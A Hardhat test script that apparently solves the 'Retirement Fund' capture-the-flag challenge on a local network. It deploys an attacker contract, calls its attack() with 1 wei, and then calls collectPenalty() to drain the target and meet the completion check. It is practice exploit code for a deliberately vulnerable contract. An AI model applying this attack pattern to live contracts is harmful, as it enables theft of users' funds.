import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils } = ethers;

describe('RetirementFundChallenge', () => {
  let target: Contract;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    const targetFactory = await ethers.getContractFactory('RetirementFundChallenge');
    target = await targetFactory.deploy(attacker.address, {
      value: utils.parseEther('1'),
    });
    await target.deployed();

    console.log('Target deployed to:', target.address);
  });

  it('Exploit', async () => {
    const attackerFactory = await ethers.getContractFactory('RetirementFundChallengeAttacker');
    const attackerContract = await attackerFactory.deploy(target.address);
    await attackerContract.deployed();

    let tx;

    console.log('1 - Attacking');
    tx = await attackerContract.connect(attacker).attack({
      value: 1,
    });
    await tx.wait();

    console.log('2 - Collecting penalty');
    tx = await target.connect(attacker).collectPenalty();
    await tx.wait();
  });

  after(async () => {
    expect(await target.isComplete()).to.equal(true);
  });
});
